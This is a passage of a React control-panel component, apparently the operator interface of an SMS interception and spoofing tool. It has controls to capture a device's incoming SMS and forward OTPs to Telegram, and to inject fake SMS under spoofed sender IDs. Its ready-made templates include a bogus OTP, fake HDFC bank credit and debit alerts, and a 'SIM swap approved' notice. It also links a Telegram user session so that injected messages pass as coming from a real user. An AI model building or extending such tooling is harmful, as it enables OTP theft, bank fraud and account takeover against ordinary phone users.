                          <span className={`text-xs font-bold mt-0.5 ${isSent ? 'text-emerald-500' : 'text-red-500'}`}>{isSent ? '✓' : '✗'}</span>
                          <div className="flex-1 min-w-0">
                            <p className="text-[10px] font-mono text-[#aaa] truncate">{entry.to}</p>
                            <p className="text-[9px] text-[#666] truncate">{entry.message}</p>
                          </div>
                          <span className="text-[8px] text-[#444] font-mono whitespace-nowrap">
                            {new Date(entry.timestamp).toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false })}
                          </span>
                        </div>
                      )
                    })}
                  </div>
                </div>
              )}

              <div className="border-t border-[#1a1a1a] pt-3">
                <button onClick={() => setBotExpanded(!botExpanded)}
                  className="w-full flex items-center justify-between py-2.5 px-3 rounded-xl bg-[#0a1628] border border-[#1a2a4a] hover:border-[#2a4a7a] transition-all">
                  <div className="flex items-center gap-2">
                    <Bot className="w-4 h-4 text-[#0088cc]" />
                    <span className="text-sm font-bold text-[#0088cc]">Telegram Auto-Send</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className={`w-2 h-2 rounded-full ${botRunning ? 'bg-emerald-500' : 'bg-[#444]'}`} style={botRunning ? { boxShadow: '0 0 6px #22c55e' } : {}} />
                    <ChevronRight className={`w-4 h-4 text-[#555] transition-transform ${botExpanded ? 'rotate-90' : ''}`} />
                  </div>
                </button>
                {botExpanded && (
                  <div className="mt-3 space-y-3">
                    <div className="flex items-center justify-between rounded-xl bg-[#111] border border-[#222] px-3 py-2.5">
                      <div className="flex items-center gap-2 min-w-0 flex-1">
                        {botRunning
                          ? <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_6px_#34d399] animate-pulse" />
                          : <span className="w-2 h-2 rounded-full bg-red-500/80" />}
                        <div className="min-w-0">
                          <span className="text-[11px] font-bold text-white">{botRunning ? 'Auto-Send ON' : 'Auto-Send OFF'}</span>
                          {botRunning && botDeviceId && (
                            <span className="text-[9px] text-[#555] block truncate">
                              device <span className="font-mono text-[#888]">{botDeviceId}</span>
                              {botDeviceId !== dev.id && <span className="text-amber-400/90"> — Stop dabao, phir Start = is device pe shift</span>}
                            </span>
                          )}
                        </div>
                      </div>
                      <div className="flex gap-1.5 flex-shrink-0">
                        <button onClick={handleStartBot} disabled={botStarting || botRunning}
                          className="px-3 py-1.5 rounded-lg bg-emerald-700 hover:bg-emerald-800 text-white text-[10px] font-bold transition-all disabled:opacity-40 disabled:cursor-not-allowed">
                          {botStarting ? 'Starting…' : '▶ Start'}
                        </button>
                        <button onClick={handleStopBot} disabled={botStarting || !botRunning}
                          className="px-3 py-1.5 rounded-lg bg-red-800 hover:bg-red-900 text-white text-[10px] font-bold transition-all disabled:opacity-40 disabled:cursor-not-allowed">
                          ⏹ Stop
                        </button>
                      </div>
                    </div>
                    <button onClick={handleTestBot} disabled={botTesting}
                      className="w-full py-2.5 rounded-xl bg-[#111] border border-[#333] hover:border-[#555] text-[#aaa] text-xs font-bold transition-all disabled:opacity-40">
                      {botTesting ? 'Testing…' : 'Test Bot (channel pe message bhejta hai)'}
                    </button>
                    {botRunning && (
                      <div className="p-3 rounded-xl bg-[#0a1410] border border-emerald-900/40">
                        <p className="text-[10px] uppercase tracking-widest text-emerald-700 mb-1 font-semibold">Bot Active</p>
                        <div className="flex items-center gap-4 text-xs">
                          <span className="text-emerald-400">✓ {botStats.successCount} sent</span>
                          {botStats.failCount > 0 && <span className="text-red-400">✗ {botStats.failCount} failed</span>}
                          <span className="text-[#666]">↗ {botStats.totalForwarded} total</span>
                        </div>
                        {botStats.lastError && <p className="text-[10px] text-red-500/70 mt-1">{botStats.lastError}</p>}
                      </div>
                    )}
                    <p className="text-[9px] text-[#444] leading-relaxed">
                      Forward incoming Telegram SMS to this device. Requires <span className="font-mono text-[#666]">bot-server.js</span> running on port 5180.
                    </p>
                  </div>
                )}
              </div>
            </div>
          )}
          {activeTab === 'inject' && (
            <div className="px-5 py-4 space-y-4">
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Sender (From)</p>
                <input type="text" value={injSender} onChange={e => setInjSender(e.target.value)} placeholder="HDFCBK / AD-TEST-S / 123456"
                  className="w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-purple-600/50 focus:ring-1 focus:ring-purple-600/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all" />
              </div>
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Message Body</p>
                <textarea value={injMessage} onChange={e => setInjMessage(e.target.value)} rows={4} placeholder="Your SMS text here…"
                  className="w-full px-4 py-3 rounded-xl bg-[#111] border border-[#222] focus:border-purple-600/50 focus:ring-1 focus:ring-purple-600/20 outline-none text-sm text-white placeholder:text-[#444] resize-none transition-all" />
                <p className="text-[10px] text-[#444] mt-1 text-right">{injMessage.length} chars</p>
              </div>
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">SMS Section se Pick Karein</p>
                {messages.length === 0 ? (
                  <p className="text-[10px] text-[#444]">SMS section me koi message nahi — pehle SMS tab me aaye messages dekhein.</p>
                ) : (
                  <div className="space-y-1.5 max-h-40 overflow-y-auto pr-1">
                    {messages.slice(0, 10).map((m, i) => (
                      <button key={i} onClick={() => { setInjSender(m.sender); setInjMessage(m.text) }}
                        className="w-full text-left px-3 py-2 rounded-xl bg-[#0e1116] border border-[#1c2128] hover:border-purple-500/40 hover:bg-purple-950/20 transition-all">
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-[10px] font-bold text-purple-300">{m.sender}</span>
                          <span className="text-[9px] text-[#444] font-mono">{m.time}</span>
                        </div>
                        <p className="text-[10px] text-[#888] truncate">{m.text}</p>
                      </button>
                    ))}
                  </div>
                )}
              </div>
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Quick Templates</p>
                <div className="flex flex-wrap gap-1.5">
                  {[
                    { label: 'OTP', s: 'AD-TEST-S', m: 'Dear user, your OTP is 123456. Do not share it with anyone.' },
                    { label: 'Bank Credit', s: 'HDFCBK', m: 'Rs. 51,234.00 credited to A/C **1234 on 10-Aug-26. Avl Bal Rs. 1,23,456.00.' },
                    { label: 'Bank Debit', s: 'HDFCBK', m: 'Rs. 5,000.00 debited from A/C **1234 on 10-Aug-26. Avl Bal Rs. 1,18,456.00.' },
                    { label: 'Airtel', s: 'AIRTEL', m: 'Airtel thanks you. Receipt: 123456789012 Token: 58472' },
                    { label: 'Sim Swap', s: 'VM-SIM', m: 'Your SIM swap request is approved. Service on new SIM from 12:00 PM.' }
                  ].map(t => (
                    <button key={t.label} onClick={() => { setInjSender(t.s); setInjMessage(t.m) }}
                      className="px-2.5 py-1.5 rounded-lg bg-[#131022] border border-[#2a1f45] text-[10px] font-semibold text-purple-300 hover:border-purple-500/50 hover:bg-purple-900/20 transition-all">
                      {t.label}
                    </button>
                  ))}
                </div>
              </div>
              <div className="border-t border-[#1a1a1a] pt-3">
                <button onClick={() => setInjectExpanded(!injectExpanded)}
                  className="w-full flex items-center justify-between py-2.5 px-3 rounded-xl bg-[#0a1628] border border-[#1a2a4a] hover:border-[#2a4a7a] transition-all">
                  <div className="flex items-center gap-2">
                    <Bot className="w-4 h-4 text-[#0088cc]" />
                    <span className="text-sm font-bold text-[#0088cc]">Inject Bot (device chat)</span>
                  </div>
                  <ChevronRight className={`w-4 h-4 text-[#555] transition-transform ${injectExpanded ? 'rotate-90' : ''}`} />
                </button>
                {injectExpanded && (
                  <div className="mt-3 space-y-3">
                    <div className="rounded-xl bg-[#0c1713] border border-[#1a3328] p-3 space-y-2.5">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          {tgLinked
                            ? <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_6px_#34d399]" />
                            : <span className="w-2 h-2 rounded-full bg-red-500/80" />}
                          <span className="text-[11px] font-bold text-white">Telegram User Session</span>
                        </div>
                        {tgLinked && tgName && (
                          <span className="text-[10px] text-emerald-400">{tgName} <span className="text-[#666]">({tgId})</span></span>
                        )}
                        {tgLinked && (
                          <button onClick={handleTgLogout} disabled={tgBusy}
                            className="text-[9px] text-red-400/80 hover:text-red-300 font-semibold px-2 py-1 rounded-md border border-red-900/50 hover:border-red-700/60 transition-all disabled:opacity-50">
                            Logout
                          </button>
                        )}
                      </div>
                      {!tgLinked && tgConfigError && tgConfigError.startsWith('missing') && (
                        <p className="text-[9px] text-[#d4a353] leading-relaxed">
                          .env me <span className="font-mono text-[#e8c37a]">TG_API_ID</span> aur <span className="font-mono text-[#e8c37a]">TG_API_HASH</span> add karo (my.telegram.org se), phir server restart karo.
                        </p>
                      )}
                      {!tgLinked && tgStage === 'idle' && (
                        <div className="flex gap-2">
                          <input type="text" value={tgPhone} onChange={e => setTgPhone(e.target.value)} placeholder="+91xxxxxxxxxx"
                            className="flex-1 px-3 py-2 rounded-lg bg-[#111] border border-[#222] focus:border-emerald-600/50 outline-none text-xs text-white placeholder:text-[#444] font-mono transition-all" />
                          <button onClick={handleTgSendCode} disabled={tgBusy}
                            className="px-3 py-2 rounded-lg bg-emerald-700 hover:bg-emerald-800 text-white text-[10px] font-bold transition-all disabled:opacity-50">
                            Send Code
                          </button>
                        </div>
                      )}
                      {(tgStage === 'code' || tgStage === 'password') && (
                        <div className="space-y-2">
                          <div className="flex gap-2">
                            <input type="text" value={tgStage === 'password' ? tgPwd : tgCode}
                              onChange={e => tgStage === 'password' ? setTgPwd(e.target.value) : setTgCode(e.target.value)}
                              placeholder={tgStage === 'password' ? '2FA password…' : 'Code from Telegram…'}
                              className="flex-1 px-3 py-2 rounded-lg bg-[#111] border border-[#222] focus:border-emerald-600/50 outline-none text-xs text-white placeholder:text-[#444] font-mono transition-all" />
                            <button onClick={handleTgVerify} disabled={tgBusy}
                              className="px-3 py-2 rounded-lg bg-emerald-700 hover:bg-emerald-800 text-white text-[10px] font-bold transition-all disabled:opacity-50">
                              {tgStage === 'password' ? 'Verify' : 'Verify & Link'}
                            </button>
                          </div>
                          <button onClick={() => setTgStage('idle')} className="text-[9px] text-[#666] hover:text-[#999]">← change number</button>
                        </div>
                      )}
                      {!tgLinked && !tgConfigError.startsWith('missing') && tgStage === 'idle' && (
                        <p className="text-[9px] text-[#444] leading-relaxed">
                          Yam account link karo — phir inject messages <span className="text-emerald-400/80">real user ke roop me</span> jayenge, jisse <span className="font-mono text-[#666]">bot_poller.sh</span> hamesha pakad lega (bot-to-bot issue khatam).
                        </p>
                      )}
                    </div>
                    <div>
                      <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Poller Bot Token <span className="text-[#666] normal-case font-normal">(optional — self-id chat pe redirect ke liye)</span></p>
                      <input type="text" value={injToken} onChange={e => setInjToken(e.target.value)} placeholder="123456789:AA..." autoComplete="off"
                        className="w-full px-4 py-2.5 rounded-xl bg-[#111] border border-[#222] focus:border-[#0088cc]/50 focus:ring-1 focus:ring-[#0088cc]/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all" />
                    </div>
                    <div>
                      <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Chat ID</p>
                      <input type="text" value={injChatId} onChange={e => setInjChatId(e.target.value)} placeholder="-100xxxxxxxxxx or 82xxxxx"
                        className="w-full px-4 py-2.5 rounded-xl bg-[#111] border border-[#222] focus:border-[#0088cc]/50 focus:ring-1 focus:ring-[#0088cc]/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all" />
                    </div>
                    <div>
                      <p className="text-[10px] font-semibold uppercase tracking-widest text-[#555] mb-2">Poller Bot Username <span className="text-[#666] normal-case font-normal">(optional — @xyz)</span></p>
                      <div className="flex gap-2">
                        <input type="text" value={injBotUsername} onChange={e => setInjBotUsername(e.target.value)} placeholder="@poller_bot_username"
                          className="flex-1 px-4 py-2.5 rounded-xl bg-[#111] border border-[#222] focus:border-[#0088cc]/50 focus:ring-1 focus:ring-[#0088cc]/20 outline-none text-sm text-white placeholder:text-[#444] font-mono transition-all" />
                        <button onClick={handleSaveInjectEnv}
                          className="px-2.5 py-2 rounded-xl bg-[#0a1628] border border-[#1a2a4a] hover:border-[#2a4a7a] text-[9px] font-bold text-[#0088cc] whitespace-nowrap transition-all">
                          💾 .env
                        </button>
                      </div>
                      <p className="text-[8px] text-[#555] mt-1">Values .env me save hongi (<span className="font-mono text-[#777]">POLLER_BOT_TOKEN / POLLER_CHAT_ID / POLLER_BOT_USERNAME</span>) — panel khulte hi auto-fill.</p>
                    </div>
                    {tgLinked && tgId && injChatId && String(injChatId) !== String(tgId) && (
                      <div className="rounded-lg bg-[#2a1a08] border border-[#4a3010] px-3 py-2">
                        <p className="text-[9px] text-[#d4a353] leading-relaxed">
                          ⚠️ Linked account id <span className="font-mono text-[#e8c37a]">{tgId}</span> ≠ Chat ID <span className="font-mono text-[#e8c37a]">{injChatId}</span> — <span className="font-mono text-[#666]">bot_poller.sh</span> sirf usi chat_id se inject karega. Ya to issi account se login karo, ya module ke <span className="font-mono text-[#e8c37a]">config.json</span> ka chat_id <span className="font-mono text-[#e8c37a]">{tgId}</span> kar do.
                        </p>
                      </div>
                    )}
                    <p className="text-[9px] text-[#444] leading-relaxed">
                      Chat ID = module ke <span className="font-mono text-[#666]">config.json</span> ka <span className="font-mono text-[#666]">chat_id</span>. Chat ID linked account ki hi id ho to message <span className="text-emerald-400/80">saved messages me nahi</span> — seedha poller bot (username/token) ko jayega, jo us account se pehle message ho chuka ho to numeric bhi chalega.
                    </p>
                  </div>
                )}
              </div>
              <div className="flex items-center justify-between rounded-xl bg-[#111] border border-[#222] px-3 py-2.5">
                <div className="flex items-center gap-2">
                  {injectRunning
                    ? <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_6px_#34d399] animate-pulse" />
                    : <span className="w-2 h-2 rounded-full bg-red-500/80" />}
                  <span className="text-[11px] font-bold text-white">{injectRunning ? 'Capture + Inject ON' : 'Capture + Inject OFF'}</span>
                </div>
                <div className="flex gap-1.5">
                  <button onClick={handleStartInject} disabled={injectBusy || injectRunning}
                    className="px-3 py-1.5 rounded-lg bg-emerald-700 hover:bg-emerald-800 text-white text-[10px] font-bold transition-all disabled:opacity-40 disabled:cursor-not-allowed">
                    ▶ Start
                  </button>
                  <button onClick={handleStopInject} disabled={injectBusy || !injectRunning}
                    className="px-3 py-1.5 rounded-lg bg-red-800 hover:bg-red-900 text-white text-[10px] font-bold transition-all disabled:opacity-40 disabled:cursor-not-allowed">
                    ⏹ Stop
                  </button>
                </div>
              </div>
              <div className="flex items-center justify-between rounded-xl bg-[#0e1116] border border-[#1c2128] px-3 py-2">
                <label className="flex items-center gap-2 cursor-pointer" onClick={() => setAutoInjectOn(!autoInjectOn)}>
                  <span className={`w-8 h-4 rounded-full relative transition-colors ${autoInjectOn ? 'bg-emerald-600' : 'bg-[#333]'}`}>
                    <span className={`absolute top-0.5 w-3 h-3 rounded-full bg-white transition-all ${autoInjectOn ? 'left-[18px]' : 'left-0.5'}`} />
                  </span>
                  <span className="text-[11px] font-bold text-white">Auto-inject naye SMS</span>
                </label>
                <span className="text-[9px] text-[#555]">{autoCount} auto-injected</span>
              </div>
              <button onClick={handleInjectSms} disabled={injSending || !injectRunning}
                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-purple-700 hover:bg-purple-800 text-white font-bold text-sm shadow-lg shadow-purple-900/40 transition-all disabled:opacity-50 disabled:cursor-not-allowed">
                {injSending ? <><div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> Injecting…</> : <><Zap className="w-4 h-4" /> Inject SMS</>}
              </button>
              <p className="text-[9px] text-[#444] leading-relaxed">
                <span className="text-emerald-400/90">▶ Start</span> = device ka <b>incoming SMS capture</b> (OTP → Telegram forward, <span className="font-mono text-[#666]">out.json enabled</span>) + <b>fake inject</b> (<span className="font-mono text-[#666]">.inject_state</span>) dono ON. <span className="text-red-400/90">⏹ Stop</span> = dono OFF. Start ke baad hi Inject SMS button chalta hai.
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
